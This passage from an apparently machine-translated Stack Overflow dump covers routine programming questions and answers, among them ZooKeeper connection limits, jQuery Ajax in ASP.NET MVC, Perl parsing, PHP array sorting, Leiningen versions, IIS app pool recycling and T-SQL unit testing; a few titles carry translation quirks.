  Zookeeper version: 3.3.3-cdh3u0--1, built on 03/26/2011 00:20 GMT
  Clients:
   /192.168.40.120:58484[1]\(queued=0,recved=39199,sent=39203)
   /192.168.40.120:37129[1]\(queued=0,recved=162,sent=162)
   /192.168.40.120:58485[1]\(queued=0,recved=39282,sent=39316)
   /192.168.40.120:58488[1]\(queued=0,recved=39224,sent=39226)
   /192.168.40.120:58030[0]\(queued=0,recved=1,sent=0)
   /192.168.40.120:58486[1]\(queued=0,recved=39248,sent=39267) 
```

我的开发团队目前使用的是 CDH3U0 发行版，所以是 HBase 0.90.1——这是在最近的版本中解决的问题吗？或者我应该对当前的设置做些什么？我是否应该期望重新启动 ZK 并定期杀死客户端？我愿意接受任何可以让我的工作始终如一地完成的合理选择。

```
2012-06-27 13:01:07,289 INFO org.apache.zookeeper.ClientCnxn: Opening socket connection to server SS-WS-M102/192.168.40.120:2181
2012-06-27 13:01:07,289 INFO org.apache.zookeeper.ClientCnxn: Socket connection established to SS-WS-M102/192.168.40.120:2181, initiating session
2012-06-27 13:01:07,290 WARN org.apache.zookeeper.ClientCnxn: Session 0x0 for server SS-WS-M102/192.168.40.120:2181, unexpected error, closing socket connection and attempting reconnect
java.io.IOException: Connection reset by peer
    at sun.nio.ch.FileDispatcher.read0(Native Method)
    at sun.nio.ch.SocketDispatcher.read(SocketDispatcher.java:21)
    at sun.nio.ch.IOUtil.readIntoNativeBuffer(IOUtil.java:202)
    at sun.nio.ch.IOUtil.read(IOUtil.java:169)
    at sun.nio.ch.SocketChannelImpl.read(SocketChannelImpl.java:243)
    at org.apache.zookeeper.ClientCnxn$SendThread.doIO(ClientCnxn.java:858)
    at org.apache.zookeeper.ClientCnxn$SendThread.run(ClientCnxn.java:1130)
[lines above repeat 6 more times]
2012-06-27 13:01:17,890 ERROR org.apache.hadoop.hbase.mapreduce.TableInputFormat: org.apache.hadoop.hbase.ZooKeeperConnectionException: org.apache.hadoop.hbase.ZooKeeperConnectionException: org.apache.zookeeper.KeeperException$ConnectionLossException: KeeperErrorCode = ConnectionLoss for /hbase
    at org.apache.hadoop.hbase.client.HConnectionManager$HConnectionImplementation.getZooKeeperWatcher(HConnectionManager.java:991)
    at org.apache.hadoop.hbase.client.HConnectionManager$HConnectionImplementation.setupZookeeperTrackers(HConnectionManager.java:302)
    at org.apache.hadoop.hbase.client.HConnectionManager$HConnectionImplementation.<init>(HConnectionManager.java:293)
    at org.apache.hadoop.hbase.client.HConnectionManager.getConnection(HConnectionManager.java:156)
    at org.apache.hadoop.hbase.client.HTable.<init>(HTable.java:167)
    at org.apache.hadoop.hbase.client.HTable.<init>(HTable.java:145)
    at org.apache.hadoop.hbase.mapreduce.TableInputFormat.setConf(TableInputFormat.java:91)
    at org.apache.hadoop.util.ReflectionUtils.setConf(ReflectionUtils.java:62)
    at org.apache.hadoop.util.ReflectionUtils.newInstance(ReflectionUtils.java:117)
    at org.apache.hadoop.mapred.MapTask.runNewMapper(MapTask.java:605)
    at org.apache.hadoop.mapred.MapTask.run(MapTask.java:322)
    at org.apache.hadoop.mapred.Child$4.run(Child.java:268)
    at java.security.AccessController.doPrivileged(Native Method)
    at javax.security.auth.Subject.doAs(Subject.java:396)
    at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1115)
    at org.apache.hadoop.mapred.Child.main(Child.java:262)
Caused by: org.apache.hadoop.hbase.ZooKeeperConnectionException: org.apache.zookeeper.KeeperException$ConnectionLossException: KeeperErrorCode = ConnectionLoss for /hbase
    at org.apache.hadoop.hbase.zookeeper.ZooKeeperWatcher.<init>(ZooKeeperWatcher.java:147)
    at org.apache.hadoop.hbase.client.HConnectionManager$HConnectionImplementation.getZooKeeperWatcher(HConnectionManager.java:989)
    ... 15 more
Caused by: org.apache.zookeeper.KeeperException$ConnectionLossException: KeeperErrorCode = ConnectionLoss for /hbase
    at org.apache.zookeeper.KeeperException.create(KeeperException.java:90)
    at org.apache.zookeeper.KeeperException.create(KeeperException.java:42)
    at org.apache.zookeeper.ZooKeeper.create(ZooKeeper.java:637)
    at org.apache.hadoop.hbase.zookeeper.ZKUtil.createAndFailSilent(ZKUtil.java:902)
    at org.apache.hadoop.hbase.zookeeper.ZooKeeperWatcher.<init>(ZooKeeperWatcher.java:133)
    ... 16 more 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-29T15:50:58.927

结果我达到了 ZooKeeper 的默认下限（我相信在最新版本中已经增加了）。我曾尝试在 hbase-site.xml 中设置更高的限制：

```
<property>
  <name>hbase.zookeeper.property.maxClientCnxns</name>
  <value>35</value>
</property> 
```

但它似乎不起作用，除非它（也是？）在 zoo.cfg 中指定：

```
# can put this number much higher if desired
maxClientCnxns=35 
```

该作业现在可以运行数小时，我的 ZK 客户列表达到 12 个条目的峰值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T21:35:27.130

我过去也遇到过类似的问题。很多时候使用 HBase/Hadoop，您会看到错误消息并不能指出您遇到的真正问题，因此您必须发挥创造力。

这是我发现的，它可能适用于您，也可能不适用于您：

您是否打开了很多与表的连接，并在完成后关闭它们？如果您在 Mapper 或 Reducer 中执行 Scans/Gets（如果可以避免的话，我认为您不想这样做），这可能发生在 MR 作业中。

此外，如果我的 Mapper 或 Reducer 大量写入同一行，有时我会遇到类似的问题。尝试分发您的写入或最小化写入以减少此问题。

如果您详细了解 MR 工作的性质，这也会有所帮助。它有什么作用？你有示例代码吗？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-03T11:49:44.640

检查以下参数：

zookeeper session timeout(zookeeper.session.timeout) --> 尝试增加并检查

zookeeper ticktime(tickTime) -> 增加和测试

检查 ulimit（linux 命令检查运行 hadoop/hbase 的用户）规范

在 ulimit 情况下，您必须具有更高的值的后续参数。

打开的文件使这有点 32K 或更多

最大用户进程使其成为无限

完成这些更改后，验证很可能错误将消失

# c# - 按钮单击不触发 jQuery(Ajax) 功能更新页面

> ID：11235419
> 
> 赞同：-2
> 
> 时间：2012-06-27T22:02:07.303
> 
> 标签：c#, html, asp.net-mvc, jquery

我有一个显示学生信息的网站。我想在网站上添加几个文本字段，并在单击按钮时使用 jQuery(Ajax) 异步更新这些字段。我相信我已经满足了所有要求，但数据仍未更新。

我在这里错过了什么吗？单击按钮什么也不做。

这是我的代码 -

控制器：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using Student.Models;    

namespace Student.Controllers
{
    public class StudentController : Controller
    {           
        public ActionResult Index()
        {
            return View("Student");
        }  

        [HttpPost()]    
        public ActionResult DisplayStudentName(string id)
        {
            StudentDataContext db = new StudentDataContext();
            var StudentName = (from p in db.vwStudent.Where(a => a.StudentId == id)
                             group p by p.StudentName into g
                             select g.Key).FirstOrDefault();

            ViewData["StudentName"] = StudentName;

            return View("Student");

        }

        [HttpPost()]
        public ActionResult DisplayStudentStatus(int? id, string flg)
        {
            AccountDataContext db = new AccountDataContext();
            var StudentStatus = (from p in db.vwStudent.Where(a => a.StudentId == id && a.LastFlag == flg)
                             group p by p.Status into g
                             select g.Key).FirstOrDefault();

            ViewData["StudentStatus "] = StudentStatus;

            return View("Student");

        }

    }
} 
```

jQuery：

```
 $("#Button1").click(function() {
        var link = '<%= Url.Action("DisplayStudentName", "Student")';
        $.ajax({
            url: link,
            data: "{id: '<%= ViewContext.RouteData.Values["id"] %>'}",
            dataType: "html",
            success: Success,
            error: Fail
        });
    });

    $("#Button2").click(function() {
        var link = '<%= Url.Action("DisplayStudentStatus", "Student")';
        $.ajax({
            url: link,
            data: "{id: '<%= ViewContext.RouteData.Values["id"] %>' , 
                    flg: '<%= ViewContext.RouteData.Values["flg"] %>'}",
            dataType: "html",
            success: Success,
            error: Fail
        });
    });

function Success(){
alert("Success");
}

function Fail(){
alert("Fail");
} 
```

看法：

```
 <%@ Page Title="" Language="C#" MasterPageFile="~/Views/Shared/Site.Master" Inherits="System.Web.Mvc.ViewPage<dynamic>" %>

    <asp:Content ID="Content1" ContentPlaceHolderID="TitleContent" runat="server">
        Student Form
    </asp:Content>

    <asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">

    <form id="form1" method="get" runat="server">

Student ID:<input type="text" name="id" id="StudentId" value="<%=HttpContext.Current.Request.QueryString["id"]%>" /><br />

Student Name:<input type="text" name="StudentName" id="StudentName" value="<%=ViewData["StudentName"]%>"/>
<div id="Btn1"><input type="button" value="Display Student Name" name="Btn1" id="Button1" />
</div>

Student Status:<input type="text" name="StudentStatus" id="StudentStatus" value="<%=HttpContext.Current.Request.QueryString["StudentStatus"]%>" />       
<div id="Btn2"><input type="button" value="Display Profit Center" name="Btn2" id="Button2" />
</div>

</div>         
</form>
</asp:Content> 
```

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T06:20:43.110

我看到您的代码有几个问题：

*   您不应该将`data`参数包含在单引号中。
*   您的成功和错误参数不应是字符串。它们应该是函数
*   您永远不应该在 ASP.NET MVC 应用程序中对 url 进行硬编码。处理 url 时应始终使用 url 助手

所以：

```
$("#Button1").click(function() {
    var link = '<%= Url.Action("DisplayStudentName", "Student")';
    $.ajax({
        url: link,
        data: { id: '<%= ViewContext.RouteData.Values["id"] %>' },
        success: Success,
        error: Fail
    });
});

$("#Button2").click(function() {

    var link = '<%= Url.Action("DisplayStudentStatus", "Student")';
    $.ajax({
        url: link,
        data: {
            id: '<%= ViewContext.RouteData.Values["id"] %>' , 
            flg: '<%= ViewContext.RouteData.Values["flg"] %>' 
        },
        success: Success,
        error: Fail
    });
}); 
```

显然，您必须声明使用的 2 个函数：

```
function Success(data) {
    // ...
}

function Fail() {
    // ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T00:25:22.320

需要在你的ajax参数中提到post

```
 $.ajax({
            url: link,
            type: 'post', 
```

您还提到 json 作为 ajax 函数中的数据类型，但您的操作正在返回 text/html。

进行这 2 项更改，如果它不起作用，请检查 fiddler 以查看您从服务器获得的响应。

如果你得到一个有效的响应，那么检查你的成功函数，看看你是否做对了。

如果您想在您的操作中支持获取和发布场景，请将您的操作的属性更改为

```
 [AcceptVerbs(HttpVerbs.Get | HttpVerbs.Post)] 
```

# perl - 在一行中解析多个关键字值对 - 混合分隔符 - Text::Balanced

> ID：11235420
> 
> 赞同：3
> 
> 时间：2012-06-27T22:02:13.387
> 
> 标签：perl

具有以下文件结构 - 请参阅**DATA**部分：

```
#!/usr/bin/perl  
use strict;
use warnings;
use Text::Balanced qw(extract_bracketed);

my($ALL, $name, $pairs);
while(defined($name = <DATA>) && defined($pairs = <DATA>)) {
    $ALL->{$name} = parse_pairs($pairs);
}

sub parse_pairs {
    my $str = shift;

    my($extracted, $remainder) = extract_bracketed($str,'{}'); # how to?

}    
__DATA__
name1
key1 val1 key2 {val2a val2b} key3 val3
name2
key2 val2 key3 val3
name3
key1 {val1a val1b val1c} key2 {val2a val2b} 
```

例如，每个奇数行包含一个唯一的“名称”，每个偶数行包含多个“键值”对 - 以空格分隔。

*   密钥始终是一个单词 (\w+)
*   该值可以是：
    *   一个字符串 (\S+)，或
    *   多个空格分隔的字符串，用括号 { } 括起来

需要将上述文件转换为 perl 结构，或者：

```
$ALL => {
    name1 => {
        key1 => ["val1"],
        key2 => ["val2a", "val2b"],
        key3 => ["val3"]
    },
[.......] 
```

或者

```
$ALL => {
    name1 => {
        key1 => {
           val1 => undef,
        },
        key2 => {
           val2a => undef,
           val2b => undef,
        }
        key3 => {
           val3 => undef,
        }
    },
[.......] 
```

这*可能*是 Text::Ballanced 的工作，但不知道如何使用它，因为这里是混合值，有些只是简单的单词，有些是平衡的 - 括号括起来，不知道如何*重复*提取. ;(

需要一些提示，如何`parse_pairs`在上面的 src 中编写 sub。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:30:58.197

这就是我所拥有的。但是，它没有使用 Text::Balanced。它使用 Regexp::Common：

```
#!/usr/bin/perl  
use strict;
use warnings;
use Regexp::Common;

my($ALL, $name, $pairs);
while(defined($name = <DATA>) && defined($pairs = <DATA>)) {
    chomp $name;
    chomp $pairs;
    $ALL->{$name} = parse_pairs($pairs);
}
use Data::Dump; dd $ALL;

sub parse_pairs {
    my $str = shift;

    my @key_values = $str =~ /
        (\w+)    # key
        \s*
        (\w+|$RE{balanced}{-parens=>'{}'}) # value
        \s*/xg;

    my $r;
    while (@key_values)
    {
        $key_values[1] =~ s/^\{//;
        $key_values[1] =~ s/\}$//;
        $r->{$key_values[0]} = [ split /\s+/, $key_values[1] ];
        splice @key_values, 0, 2;
    }
    $r;
}
__DATA__
name1
key1 val1 key2 {val2a val2b} key3 val3
name2
key2 val2 key3 val3
name3
key1 {val1a val1b val1c} key2 {val2a val2b} 
```

这似乎会产生您正在寻找的输出（选项 1）。

# php - Mysql会话数据数组解释

> ID：11235425
> 
> 赞同：0
> 
> 时间：2012-06-27T22:03:03.457
> 
> 标签：php, mysql, codeigniter, session

我正在使用 Codeigniter 的会话库在我的表中添加会话数据。

**从文档：**

```
$newdata = array(
                   'username'  => 'johndoe',
                   'email'     => 'johndoe@some-site.com',
                   'logged_in' => TRUE
               );

$this->session->set_userdata($newdata); 
```

例如，在我的会话表中，我得到以下代码：

```
a:7:{s:9:"user_data";s:0:"";s:7:"user_id";s:2:"10";s:8:"username";s:0:"";s:9:"firstname";s:3:"Dan";s:8:"lastname";s:6:"Greeb";s:6:"status";s:1:"1";s:18:"settings_activated";i:1;} 
```

我找不到任何关于所有字母和数字含义的文档。语法是什么意思？

请注意最后一个会话项目`settings_activated`。我用它来检查用户是否输入了他/她的设置。它设置为 1 或 0。这是什么`i`意思？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:38:15.753

要访问所有会话用户数据，只需键入：

```
$data = $this->session->all_userdata(); 
```

有了这个你可以访问

```
echo $data['username']; // gives "johndoe" 
```

如果你想要一些特定的东西，你可以做

```
$username = $this->session->userdata('username');
echo $username;  // gives "johndoe" 
```

正如 Wrikken 上面提到的，您在实际表中看到的数据是序列化的，CI 不希望您直接与它交互 - 只需使用 Session 类。

# php - PHP：有没有更好的方法来重新排序数组的值？

> ID：11235430
> 
> 赞同：1
> 
> 时间：2012-06-27T22:03:22.033
> 
> 标签：php, arrays

我有这个数组：

```
$pets = array(
   'cat' => 'Lushy',
   'dog' => 'Fido',
   'fish' => 'Goldie' 
); 
```

如果我需要通过以下方式重新排序数组：

```
fish
dog
cat 
```

按照这个顺序并假设这些值中的任何一个可能存在也可能不存在，有没有比以下更好的方法：

```
$new_ordered_pets = array();

if(isset($pets['fish'])) {
    $new_ordered_pets['fish'] = $pets['fish'];      
}
if(isset($pets['dog'])) {
    $new_ordered_pets['dog'] = $pets['dog'];        
}
if(isset($pets['cat'])) {
    $new_ordered_pets['cat'] = $pets['cat'];        
}

var_dump($new_ordered_pets); 
```

输出：

```
Array
(
    [fish] => Goldie
    [dog] => Fido
    [cat] => Lushy
) 
```

有没有一种更简洁的方法，也许是一些我不知道的内置函数，您只需提供要重新排序的数组和您希望它记录的索引，它会产生魔力吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-27T22:07:11.100

您可以使用`uksort`基于另一个数组对数组进行排序（按键）（这仅适用于 PHP 5.3+）：

```
$pets = array(
   'cat' => 'Lushy',
   'dog' => 'Fido',
   'fish' => 'Goldie' 
);
$sort = array(
    'fish',
    'dog',
    'cat'
);
uksort($pets, function($a, $b) use($sort){
    $a = array_search($a, $sort);
    $b = array_search($b, $sort);

    return $a - $b;
}); 
```

演示：[http ://codepad.viper-7.com/DCDjik](http://codepad.viper-7.com/DCDjik)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T22:09:12.553

您已经有了订单，因此您只需要分配值（[Demo](http://codepad.org/UMILqree)）：

```
$sorted = array_merge(array_flip($order), $pets);

print_r($sorted); 
```

输出：

```
Array
(
    [fish] => Goldie
    [dog] => Fido
    [cat] => Lushy
) 
```

相关：[根据另一个数组对数组进行排序？](https://stackoverflow.com/q/348410/367456)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:07:34.727

你需要的是[uksort](http://php.net/manual/en/function.uksort.php)。

```
// callback 
function pets_sort($a,$b) {
    // compare input vars and return less than, equal to , or greater than 0\. 
} 

uksort($pets, "pets_sort"); 
```

# ios - ios [[自拍] 中心].x

> ID：11235431
> 
> 赞同：1
> 
> 时间：2012-06-27T22:03:27.677
> 
> 标签：ios, ipad

在 ipad 上，当处于纵向时（不确定你是否称它为这个），[[self view] center].x 值位于中心 - 但在横向（躺下）时，它不是中心值。

有什么想法吗？

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-27T22:13:13.637

视图的`center`属性是相对于它的`superview`，这可能是`UIWindow`你的情况。由于旋转由视图控制器处理，并且窗口实际上不旋转，因此`center`您的视图保持不变。

相反，您可能想要的是视图边界的中心：

```
CGRect bounds = self.view.bounds;
CGPoint centerOfView = CGPointMake(CGRectGetMidX(bounds), CGRectGetMidY(bounds)); 
```

# ios - 记录分数的最简单方法是什么？

> ID：11235444
> 
> 赞同：-3
> 
> 时间：2012-06-27T22:04:28.340
> 
> 标签：ios, nsinteger, cgfloat

我正在寻找一个系统，如果用户在多项选择题中得到正确答案，它会更新用户的分数。我有一个 IBAction 在用户选择正确的选项时运行，我希望它更新分数。即当答案正确时得分+ 2 是CGFloat 还是NSInteger 的问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:12:42.763

尝试这样的事情：

```
//.h File
@property (nonatomic) NSUInteger score; //If the user can get a negative score, change "NSUInteger" to "NSInteger"
-(void)scoreChanged;

//.m File
-(void)scoreChanged{
    self.score += 2; //You can change the 2 to any number
}

//viewDidLoad
self.score = 0; 
```

无论您想在哪里更新分数，只需调用该`scoreChanged`方法即可。希望这可以帮助！

# clojure - 在应用程序中嵌入来自 leiningen 项目的版本字符串

> ID：11235445
> 
> 赞同：14
> 
> 时间：2012-06-27T22:04:30.043
> 
> 标签：clojure, leiningen

我希望能够查询或嵌入由 leiningen 项目设置的版本字符串并将该值显示给用户。用途包括显示来自 CLI 的版本字符串，或作为环应用程序中的标头。这可能吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-28T05:09:05.737

如果你在 Leiningen using`lein run`等内部运行，它可以作为系统属性使用：`(System/getProperty "myproject.version")`. 如果你正在生产一个罐子，你需要阅读`pom.properties`.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-10-26T19:38:42.827

我喜欢technomancy的答案，但我不得不去查找如何“阅读`pom.properties`”。原来对于maven神器com.example/my-project，在classpath下有一个文件

```
META-INF/maven/com.example/my-project/pom.properties 
```

您可以读入 java.util.Properties 并获取“版本”密钥。

```
(ns com.example.version
  (:require [clojure.java.io :as io])
  (:import (java.util Properties)))

(defn read-project-version [groupid artifact]
  (-> (doto (Properties.)
        (.load (-> "META-INF/maven/%s/%s/pom.properties"
                 (format groupid artifact)
                 (io/resource)
                 (io/reader))))
    (.get "version"))) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-09-23T13:42:37.397

有人写了一个很好的库来处理这个：[https ://github.com/trptcolin/versioneer](https://github.com/trptcolin/versioneer)

它适用于 lein 项目，既可以在 lein 中运行，也可以从 uberjar 中运行。像下面这样使用它（取自 Github 页面）：

> 将此添加到您的 project.clj：
> 
> ```
> [trptcolin/versioneer "0.2.0"] 
> ```
> 
> 然后，在您的代码中，执行类似这样的操作，其中 GROUP-ID 和 ARTIFACT-ID 是您项目的常用 Leiningen/Maven 标识符。
> 
> ```
> user=> (require '[trptcolin.versioneer.core :as version])
> nil
> user=> (version/get-version "GROUP-ID" "ARTIFACT-ID")
> "1.2.3-SNAPSHOT" 
> ```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-27T22:30:22.690

如果您构建一个 jar 文件，您可以[从 jar 文件中提取当前版本](http://www.javapractices.com/topic/TopicAction.do;jsessionid=8998920430CAF122E849421694189F6E?Id=238)。

否则，如果您不进行 AOT，则可以`read`使用 project.clj 文件（因为它是地图），然后提取版本。

我当然希望有一个更优雅的解决方案，而不是为此编写一个 leiningen 插件（除非其他人想写这个，提示提示..）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-01-20T03:30:12.873

这是我读取项目名称和版本的方式，请注意`project.clj`在编译期间读取文件，jar 文件只包含字符串：

```
(defmacro proj-version []
  (some->> (slurp "project.clj") clojure.edn/read-string (drop 1) (take 2) (str/join " ")))

(defn -main []
  (println (proj-version)) 
```

所以对于`(defproject abc "1.2.3" ...`，当你运行`-main`它会打印：

```
abc 1.2.3 
```

# asp.net - 在 WCF 服务中触发 IIS AppPool 回收

> ID：11235448
> 
> 赞同：4
> 
> 时间：2012-06-27T22:04:40.137
> 
> 标签：asp.net, wcf, iis

我正在开发一个与不稳定的第三方 C++ DLL 交互的 Web 服务。

它经常抛出`AccessViolationException`（即，DLL 内的崩溃），唯一的恢复方法是回收应用程序池。

有没有办法以编程方式回收应用程序池？

注意：我尝试更改我的 .NET DLL 和 web.config 的时间戳，但这似乎不足以让 w3wp.exe 进程卸载本机 C++ DLL。我无法触摸 C++ DLL，因为它返回错误：“DLL 正在使用中”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:09:43.030

如果您有权访问该框，则可以使用 appcmd.exe ：

```
C:\dev>\windows\system32\inetsrv\appcmd.exe apppool  /?
Administration of application pools

APPCMD (command) APPPOOL <identifier> <-parameter1:value1 ...>

Supported commands:

  list      List application pools
  set       Configure application pool
  add       Add new application pool
  delete    Delete application pool
  start     Start application pool
  stop      Stop application pool
  recycle   Recycle application pool

(To get help for each command use /?, e.g. 'appcmd.exe add site /?'.) 
```

要在代码中使用它，您需要使用它`System.Diagnostics.Process`来运行适当的回收命令。

# javascript - Javascript 函数调用 navigator.geolocation.getCurrentPosition 过于频繁地提示权限

> ID：11235453
> 
> 赞同：1
> 
> 时间：2012-06-27T22:05:26.950
> 
> 标签：javascript, html, mobile, browser

目前我的公司有网络应用程序，希望为用户当前的地理位置提供服务。

我们这样称呼定位服务（标准）：

```
navigator.geolocation.getCurrentPosition( function( position ) {
     var _lat = Math.round( position.coords.latitude * 1000 ) / 1000;
     var _lon = Math.round( position.coords.longitude * 1000 ) / 1000;
     doThis( _lat, _lon ); }, function( error ) {doThat( 0, 0 );} ); 
```

当我使用不同的最新版本浏览器和自定义设置测试我的 web 应用程序时，许多浏览器经常要求用户允许允许跟踪他的地理位置。每次调用 navigator.geolocation.getCurrentPosition 时 Safari 都会询问，移动端 Safari 在会话中一次，Chrome 会立即在设置中保存页面，不再提示用户，移动端 Internet Explorer 似乎 24 小时保存权限。有没有办法以编程方式欺骗他的行为类似于 Chrome 的浏览器（保存权限）？我认为当浏览器经常请求此权限时，这有点烦人并且不是非常用户友好，因为如果用户不想被跟踪并且我们希望提供用户友好的服务，则无论如何都可以关闭位置跟踪。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T23:36:21.627

不，你不能。该部分完全在浏览器及其设置的域中。用户可以将他的浏览器配置为他需要的东西，网站不应该能够做到这一点。

# sql-server-2008 - SQL Server Management Studio 中的单元测试

> ID：11235460
> 
> 赞同：6
> 
> 时间：2012-06-27T22:06:04.660
> 
> 标签：sql-server-2008, unit-testing, ssms

有没有办法为 SSMS 中的 SQL 查询创建简单的单元测试？我对 T-SQL 和 SSMS 还很陌生，但如果可能的话，我想尝试将我的一些旧 TDD 习惯带入这个领域。

因此，例如，当我编写 DDL 以创建复杂的函数等时，我希望有一些方法来包含一个单元测试，该单元测试（在失败时）实际上会导致输出面板在执行时显示错误消息. （这类似于在正常编程环境中“破坏构建”。）

目前，当我编写一个语法正确的函数，然后按 F5 执行它时，输出消息是：

```
Command(s) completed successfully. 
```

我正在寻找的是一些简单的 SQL 技巧来模拟基本的红灯/绿灯测试用例。所以我会编写一系列测试语句，只有当我的用户定义函数按预期运行时才会通过。否则会显示错误消息，例如：

```
Msg 207, Level 16, State 1, Line 2
Invalid statement. 
```

这将允许我立即跳到失败的测试，看看我做错了什么。

我不希望有任何“内置”的东西，但有什么方法可以“伪造”吗？

**更新：**我刚刚了解到您可以在 SS2012 中[抛出异常](http://msdn.microsoft.com/en-us/library/ee677615.aspx)，我确信我可以将其用于此目的，但不幸的是我现在被 SS2008 困住了。SS2008有什么可比的吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-27T22:08:55.823

这些是我可以推荐的 2 个框架

**尖沙咀**

[http://tst.codeplex.com/](http://tst.codeplex.com/)

使用 TST 测试 SQL Server 代码

[http://www.infoq.com/articles/tst-sql-server](http://www.infoq.com/articles/tst-sql-server)

**tSQLt**

[http://tsqlt.org/](http://tsqlt.org/)

SQL 测试（tSQLt 的运行器）

[http://www.red-gate.com/products/sql-development/sql-test/](http://www.red-gate.com/products/sql-development/sql-test/)

**更新 1**

阅读您的答案，您可能会发现以下*转储*很有用。

TRY CATCH 是在 SQL Server 2005 中引入的（因此，永远不要看比 2005 年更早的东西）。您实际上可以使用我的转储中提到的存储过程（包括行号）来（重新）抛出异常。在 SQL Server 2012 中，他们（最后！）引入了 throw，因为您提到在 14 年后使 Tsql 成为一种健壮的语言。

所以这是我的转储，我需要有一天清理它，这样它对复制粘贴更友好。

```
SET XACT_ABORT ON
SET CONCAT_NULL_YIELDS_NULL OFF

DECLARE @message varchar ( max ) 
DECLARE @who varchar ( 255 ) 
set @who = OBJECT_NAME(@@PROCID) -- name of the currently executing sproc

BEGIN TRY

-- ======================================================================================
SET @message = 'HELLO'
EXEC Log @who, @message

         ....

-- ======================================================================================
SET @message = 'GOODBYE'
EXEC Log @who, @message

END TRY

BEGIN CATCH

        -- ======================================================================================
--If an error generated in a TRY block causes the state of the current transaction to be invalidated, the transaction is classified as an uncommittable transaction.
--An error that ordinarily ends a transaction outside a TRY block causes a transaction to enter an uncommittable state when the error occurs inside a TRY block.
-- http://msdn.microsoft.com/en-us/library/ms175976.aspx
       if XACT_STATE() = -1 rollback;

    -- ======================================================================================
SET @message = 'Rolling Back transaction if present'
EXEC Log @who, @message

     -- Its important to rollback the transaction at the very start of the catch.
-- Otherwise the records that are written to the log will also be roll backed.

IF @@TRANCOUNT > 0 
BEGIN
ROLLBACK TRAN 
END

-- ======================================================================================
SET @message = 'Error Occured '
set @message = @message + ' ERROR_NUMBER() : ' + cast(ERROR_NUMBER() as varchar(max))
set @message = @message + ' ERROR_SEVERITY() : ' + cast(ERROR_SEVERITY() as varchar(max))
set @message = @message + ' ERROR_STATE() : ' + cast(ERROR_STATE() as varchar(max))
set @message = @message + ' ERROR_PROCEDURE() : ' +cast(ERROR_PROCEDURE() as varchar(max))
set @message = @message + ' ERROR_LINE() : ' + cast(ERROR_LINE() as varchar(max))
set @message = @message + ' ERROR_MESSAGE() : ' + cast(ERROR_MESSAGE() as varchar(max))

EXEC Log @who, @message

  exec usp_RethrowError

END CATCH

Error logging sproc and table

CREATE PROCEDURE [dbo].[Log]
(
@who varchar(255),
@message varchar(max)
)
AS

SET XACT_ABORT ON
SET CONCAT_NULL_YIELDS_NULL OFF

INSERT INTO [ApplicationLog]
(
[Date],
[Level],
[Logger],
[Host],
[Message]
)
VALUES
(
getDate(),
'INFO',
@who,
'dummy',
@message
)

CREATE TABLE [dbo].[ApplicationLog] (
[Id]            [int] IDENTITY(1, 1) NOT NULL,
[Date]          [datetime] NOT NULL,
[Thread]        [varchar](255)  NULL,
[Level]         [varchar](50) NOT NULL,
[Logger]        [varchar](255)  NOT NULL,
[Host]          [varchar](50)  NOT NULL,
[Message]       [varchar](max)  NOT NULL,
[Exception]     [varchar](max) NULL
)

Rethrow an exception

ALTER PROCEDURE [dbo].[usp_RethrowError]
 -- BOL contains a good example of that, there is a stored procedure called usp_RethrowError

AS -- Return if there is no error information to retrieve.

SET XACT_ABORT ON
SET CONCAT_NULL_YIELDS_NULL OFF

IF ERROR_NUMBER() IS NULL 
  RETURN ;

DECLARE @ErrorMessage NVARCHAR(4000),
  @ErrorNumber INT,
  @ErrorSeverity INT,
  @ErrorState INT,
  @ErrorLine INT,
  @ErrorProcedure NVARCHAR(200) ;

    -- Assign variables to error-handling functions that 
    -- capture information for RAISERROR.
SELECT  @ErrorNumber = ERROR_NUMBER(), @ErrorSeverity = ERROR_SEVERITY(),
        @ErrorState = ERROR_STATE(), @ErrorLine = ERROR_LINE(),
        @ErrorProcedure = ISNULL(ERROR_PROCEDURE(), '-') ;

    -- Building the message string that will contain original
    -- error information.
SELECT  @ErrorMessage = N'Error %d, Level %d, State %d, Procedure %s, Line %d, ' +
        'Message: ' + ERROR_MESSAGE() ;

    -- Raise an error: msg_str parameter of RAISERROR will contain
    -- the original error information.
RAISERROR (@ErrorMessage, @ErrorSeverity, 1, @ErrorNumber, -- parameter: original error number.
  @ErrorSeverity, -- parameter: original error severity.
  @ErrorState, -- parameter: original error state.
  @ErrorProcedure, -- parameter: original error procedure name.
  @ErrorLine-- parameter: original error line number.
        ) ; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T23:23:11.987

好吧，我找到了解决我自己问题的可能方法：[RAISERROR](http://msdn.microsoft.com/en-us/library/ms178592%28v=sql.90%29.aspx)。这在某种程度上“有效”（至少以我设想的方式），允许我构建基本测试，例如：

```
IF dbo.myTestedFunction(@parm) != @myExpectedResult
    RAISERROR('>> Unit Test FAILED! -- %d, 11, 0, @parm) 
```

这很古怪，但它*确实*显示了一条错误消息，我可以单击它跳转到有问题的代码行（在我的例子中，它是失败的单元测试）——尽管第一行有一些虚假信息。

# javascript - 有什么方法可以使禁用 HTML 的复选框变暗？

> ID：11235461
> 
